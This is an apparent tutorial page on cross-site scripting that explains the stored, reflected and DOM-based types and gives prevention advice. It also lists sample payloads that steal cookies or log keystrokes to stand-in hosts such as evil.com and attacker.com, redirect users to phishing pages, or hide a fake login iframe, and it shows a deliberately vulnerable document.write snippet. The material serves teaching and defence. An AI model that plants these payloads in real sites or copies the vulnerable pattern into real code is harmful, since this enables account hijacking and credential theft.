


![xss.png](assets/xss.png){ align=right width=180 }


A Cross-Site Scripting (XSS) attack is a security vulnerability where an attacker injects malicious scripts into a website. These scripts execute in a user’s browser without their knowledge and can be used to:

- Steal login credentials or personal data.
- Hijack user sessions.
- Redirect users to malicious websites.
- Modify or deface web pages.

Unlike other attacks, XSS does not directly compromise the website server. Instead, it exploits how a website processes and displays user-generated content.

---

### Types of XSS Attacks

There are three main types of XSS attacks:

#### 1. Stored XSS (Persistent XSS)
- The malicious script is permanently stored on the website’s database.
- Every time a user visits the infected page, the script automatically executes in their browser.
- Common targets: Comment sections, forums, user profiles.

Example:
An attacker posts a comment on a website containing:
```html
<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
```

#### 2. Reflected XSS
- The malicious script is included in a URL or form input.
- It gets executed when a victim clicks a crafted link or submits a form.
- Common targets: Search bars, login forms, error messages.

Example:
A phishing email contains a link:
```html
http://example.com/search?q=<script>document.cookie</script>
```
If the website does not sanitize input, the script executes in the user’s browser.

#### 3. DOM-Based XSS
- The attack occurs entirely in the browser, modifying the Document Object Model (DOM).
- It does not rely on the server returning a malicious script.
- Common targets: Web applications using JavaScript frameworks.

Example:
A vulnerable web page contains:
```html
<script>
var search = document.location.hash;
document.write("Results for: " + search);
</script>
```
If an attacker sends a link like `http://example.com/#<script>alert('XSS')</script>`, the script executes when the page loads.

---

### Understanding XSS Payloads

An XSS payload is the malicious script or code used in a Cross-Site Scripting (XSS) attack. It is designed to execute in a victim’s browser when they visit an infected webpage.

Payloads can be used to:
- Steal user session cookies, allowing attackers to hijack accounts.
- Redirect users to malicious websites.
- Modify a website by injecting unwanted content.
- Execute harmful JavaScript commands.

---

### Common XSS Payloads

#### 1. Simple JavaScript Alert (Testing XSS Vulnerability)
Attackers often test if a website is vulnerable to XSS using a basic alert script:
```html
<script>alert('XSS Found!')</script>
```
If the alert appears in the browser, the site is vulnerable.

#### 2. Stealing Cookies
A malicious script can steal authentication cookies:
```html
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
```

#### 3. Keylogger Injection
An attacker can capture keystrokes entered on a page:
```html
<script>
document.onkeypress = function(e) {
 fetch('http://evil.com/keystrokes?key='+e.key);
}
</script>
```

#### 4. Redirecting Users to a Malicious Site
An attacker can force a user to visit a phishing page:
```html
<script>window.location.href='http://phishing-site.com';</script>
```

#### 5. Injecting an Invisible iFrame
An attacker can load a hidden login form to capture credentials:
```html
<iframe src="http://attacker.com/fake-login" style="display:none"></iframe>
```

---

### Preventing XSS Attacks

To protect against XSS vulnerabilities, follow these best practices:

#### 1. Input Validation and Sanitization
- Use server-side validation to reject scripts and harmful input.
- Sanitize user input by removing or escaping special characters.

#### 2. Content Security Policy (CSP)
- Implement a CSP header to restrict the execution of untrusted scripts:
```html
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com;
```

#### 3. Use HTML Encoding
- Encode special characters in user input to prevent script execution:
```html
& < > " ' / (encoded as &amp; &lt; &gt; &quot; &apos; &#x2F;)
```

#### 4. Avoid `innerHTML` and `document.write()`
- Use safe DOM methods like `textContent` instead of `innerHTML`:
```html
document.getElementById("output").textContent = userInput;
```

#### 5. Implement Secure Cookies
- Use the `HttpOnly` and `Secure` flags to prevent JavaScript from accessing cookies:
```html
Set-Cookie: sessionId=abc123; HttpOnly; Secure;
```

#### 6. Regular Security Audits
- Conduct code reviews and penetration testing to identify vulnerabilities.
- Use automated security scanning tools to detect potential XSS risks.

By applying these security measures, organizations can effectively reduce the risk of XSS attacks and safeguard user data.
